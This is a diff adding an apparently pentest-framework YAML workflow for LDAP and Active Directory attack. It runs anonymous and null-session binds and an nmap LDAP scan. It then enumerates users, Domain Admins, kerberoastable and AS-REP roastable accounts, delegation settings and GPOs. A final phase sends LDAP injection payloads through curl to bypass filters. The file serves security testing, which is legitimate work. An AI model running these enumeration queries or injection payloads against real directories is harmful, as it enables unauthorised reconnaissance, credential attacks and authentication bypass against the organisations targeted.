@@ -1,0 +1,200 @@
+name: "LDAP Enumeration"
+description: "LDAP discovery and attack: anonymous binds, attribute enumeration, LDAP injection, pass-back attacks, and directory traversal"
+version: "1.0"
+
+vars:
+  domain: ""
+  dc_ip: ""
+  bind_dn: ""
+  password: ""
+  base_dn: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "LDAP enumeration against {domain} ({dc_ip}) (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Anonymous/probe binds ----
+  - id: probe_binds
+    name: "LDAP connection testing"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: ldap_anon
+        name: "Anonymous bind test"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}", "-b", "{base_dn}",
+               "-s", "base", "(objectClass=*)", "namingContexts",
+               "-o", "{case_dir}/ldap_anon_bind.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/ldap_anon_bind.txt"]
+
+      - id: ldap_nmap
+        name: "LDAP port scan"
+        tool: nmap
+        args: ["-p", "389,636,3268,3269", "--script", "ldap-rootdse",
+               "{dc_ip}",
+               "-oN", "{case_dir}/ldap_nmap.txt"]
+        timeout: 60
+
+      - id: ldap_nullsess
+        name: "Null session / simple bind"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-b", "{base_dn}",
+               "-o", "{case_dir}/ldap_null_session.txt"]
+        timeout: 30
+
+  # ---- Phase 2: Object enumeration ----
+  - id: object_enum
+    name: "LDAP object enumeration"
+    type: parallel
+    max_workers: 6
+    steps:
+      - id: users_all
+        name: "All user objects"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "{base_dn}",
+               "(objectClass=user)",
+               "sAMAccountName userPrincipalName mail memberOf distinguishedName",
+               "-o", "{case_dir}/ldap_users.txt"]
+        timeout: 120
+        artifacts: ["{case_dir}/ldap_users.txt"]
+
+      - id: groups_all
+        name: "All group objects"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "{base_dn}",
+               "(objectClass=group)",
+               "name member distinguishedName",
+               "-o", "{case_dir}/ldap_groups.txt"]
+        timeout: 120
+
+      - id: computers_all
+        name: "All computer objects"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "{base_dn}",
+               "(objectClass=computer)",
+               "dNSHostName operatingSystem distinguishedName",
+               "-o", "{case_dir}/ldap_computers.txt"]
+        timeout: 120
+
+      - id: domain_admins
+        name: "Domain Admin group members"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "{base_dn}",
+               "(&(objectClass=group)(cn=Domain Admins))",
+               "member",
+               "-o", "{case_dir}/ldap_domain_admins.txt"]
+        timeout: 60
+        artifacts: ["{case_dir}/ldap_domain_admins.txt"]
+
+      - id: spn_users
+        name: "Users with SPNs (kerberoastable)"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "{base_dn}",
+               "(&(objectClass=user)(servicePrincipalName=*))",
+               "servicePrincipalName sAMAccountName",
+               "-o", "{case_dir}/ldap_spn_users.txt"]
+        timeout: 60
+
+      - id: asrep_users
+        name: "AS-REP roastable users (DONT_REQ_PREAUTH)"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "{base_dn}",
+               "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
+               "sAMAccountName userAccountControl",
+               "-o", "{case_dir}/ldap_asrep_users.txt"]
+        timeout: 60
+
+      - id: delegation_users
+        name: "Constrained delegation users"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "{base_dn}",
+               "(&(objectClass=user)(msDS-AllowedToDelegateTo=*))",
+               "sAMAccountName msDS-AllowedToDelegateTo",
+               "-o", "{case_dir}/ldap_delegation.txt"]
+        timeout: 60
+
+  # ---- Phase 3: Attribute discovery ----
+  - id: attr_discovery
+    name: "LDAP attribute discovery"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: schema_users
+        name: "User class schema attributes"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "CN=Schema,CN=Configuration,{base_dn}",
+               "(lDAPDisplayName=*)",
+               "lDAPDisplayName attributeSyntax",
+               "-o", "{case_dir}/ldap_schema_attributes.txt"]
+        timeout: 60
+
+      - id: gpo_list
+        name: "GPO objects"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{bind_dn}", "-w", "{password}",
+               "-b", "CN=Policies,CN=System,{base_dn}",
+               "(objectClass=groupPolicyContainer)",
+               "displayName cn gPCFileSysPath",
+               "-o", "{case_dir}/ldap_gpos.txt"]
+        timeout: 60
+
+  # ---- Phase 4: LDAP injection ----
+  - id: ldap_inject
+    name: "LDAP injection probes"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: inject_simple
+        name: "Basic injection test (wildcard)"
+        tool: curl
+        args: ["-s", "{target}/?user=*)(uid=*))(|(uid=*",
+               "-o", "{case_dir}/ldap_inject_wildcard.txt"]
+        timeout: 30
+
+      - id: inject_and
+        name: "Injection — AND bypass"
+        tool: curl
+        args: ["-s", "{target}/?user=admin)(&)",
+               "-o", "{case_dir}/ldap_inject_and.txt"]
+        timeout: 30
+
+      - id: inject_or
+        name: "Injection — OR bypass"
+        tool: curl
+        args: ["-s", "{target}/?user=*)(|(uid=*",
+               "-o", "{case_dir}/ldap_inject_or.txt"]
+        timeout: 30
+
+  # ---- Phase 5: Report ----
+  - id: report
+    name: "LDAP enumeration note"
+    type: log
+    message: |
+      LDAP enumeration complete for {domain}.
+      Results in {case_dir}/:
+      - Users: ldap_users.txt, ldap_domain_admins.txt
+      - Groups: ldap_groups.txt
+      - Computers: ldap_computers.txt
+      - Targets: ldap_spn_users.txt, ldap_asrep_users.txt, ldap_delegation.txt
+      - GPOs: ldap_gpos.txt
